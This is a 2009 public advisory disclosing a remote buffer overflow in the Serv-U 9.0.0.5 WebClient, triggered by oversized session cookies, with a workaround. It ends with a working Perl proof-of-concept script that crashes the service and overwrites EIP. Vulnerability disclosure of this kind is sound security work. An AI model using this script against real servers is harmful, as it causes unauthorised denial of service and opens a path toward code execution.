@@ -1,0 +1,73 @@
+-- KC Security PUBLIC ADVISORY -- http://www.rangos.de -- 
+11-01-2009
+
+
+RhinoSoft.com Serv-U 9.0.0.5 WebClient Remote Buffer Overflow
+
+
+Background
+------------
+
+Serv-U includes a simple, browser-based transfer client perfect
+for every business environment. The Web Client is accessed through
+a standard web browser and features an unintimidating, familiar interface.
+It is a great way for sharing photos and image files with clients and
+co-workers due to its configurable thumbnail view that allows remote
+images to be quickly viewed without downloading the entire file.
+An additional slideshow view offers a fast way to share a collection 
+of photos from your latest projects. When using Serv-U, photo sharing 
+sites and large email attachments are a thing of the past!
+
+
+Description
+------------
+
+Remote exploitation of a buffer overflow in the Serv-U WebClient
+may allow attackers to execute arbitrary code.
+
+The problem lies in the handling of overly long Session Cookies.
+When a very long session cookie is sent to the Serv-U WebClient
+HTTP Service an overrun occurs and EIP becomes "overwritten".
+
+
+Detection
+------------
+KC Security confirmed the vulnerability in the latest version of Serv-U
+WebClient which is 9.0.0.5.
+
+
+Workaround
+------------
+Disable the WebClient Service and use the Serv-U FTP/SFTP components only.
+
+
+Proof of concept
+------------
+The following PERL script will crash the Serv-U.exe service and overwrite
+EIP with 0xAAAAAAAA.
+
+---snip---
+use IO::Socket;
+
+$|=1;
+$a = "A" x 100000;
+my $sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],
+                              PeerPort => '80',
+                              Proto    => 'tcp');                             
+
+print $sock "POST / HTTP/1.1\r\n"
+."Host: $ARGV[0]\r\n"
+."Cookie: killmenothing; SULang=de%2CDE; themename=vista; Session=_d838591b3a6257b0111138e6ca76c2c2409fb287b1473aa463db7f202caa09361bd7f8948c8d1adf4bd4f6c1c198eb950754581406246bf8$a\r\n"
+."Content-Type: multipart/form-data; boundary=---------------------------25249352331758\r\n"
+."Content-Length: 0\r\n\r\n";
+
+while (<$sock>) {
+	print;
+}
+---snip---
+
+
+Credit
+------------
+This vulnerability was discovered by Nikolaos Rangos of KC Security.
+Visit us at http://www.rangos.de
